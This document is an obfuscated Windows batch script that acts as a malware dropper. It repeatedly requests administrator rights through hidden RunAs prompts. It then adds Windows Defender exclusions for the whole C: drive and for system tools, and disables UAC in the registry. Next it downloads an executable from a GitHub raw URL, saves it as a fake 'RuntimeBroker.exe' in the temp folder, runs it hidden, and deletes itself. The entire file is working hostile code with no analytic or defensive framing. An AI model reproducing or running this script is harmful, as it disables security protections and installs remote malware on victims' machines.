@echo off & setlocal enableDelayedExpansion
set "PrzD=NET" & set "fOLk=2>&1" & set "ZMndA=>nul" & set "nOpof=SESSION"
%PrzD% %nOpof% %ZMndA% %fOLk%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "cceb=foo" & set "DmDE=qux" & set "Qmsv=baz" & set "XYqvB=bar" & rem cAxu Icxo samyBWJ
set "kdTJ=powershell -ExecutionPolicy Bypass -Command"
set "Pjc=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "PxMnf='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "VkK='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!kdTJ! "!Pjc! !PxMnf! !VkK!" %ZMndA% %fOLk%
set "wMJgx=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "eXyRS=-Name 'EnableLUA' -Value 0"
!kdTJ! "!wMJgx! !eXyRS!" %ZMndA% %fOLk%
set "MxXs=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!kdTJ! "!MxXs!" %ZMndA% %fOLk%
if !errorlevel! neq 0 (goto %a%)
set "mdzVT=timeout /t" & !mdzVT! 2 %ZMndA% %fOLk%
set "OPB=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "aDF=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "ZEue=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!kdTJ! "!OPB! !aDF! !ZEue!" %ZMndA% %fOLk%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!mdzVT! 1 %ZMndA% %fOLk% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %ZMndA% %fOLk%
del /f /q "%~f0" %ZMndA% %fOLk%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %ZMndA% %fOLk%
if !errorlevel! neq 0 (!mdzVT! 3 %ZMndA% %fOLk% & goto %b%)
exit /b
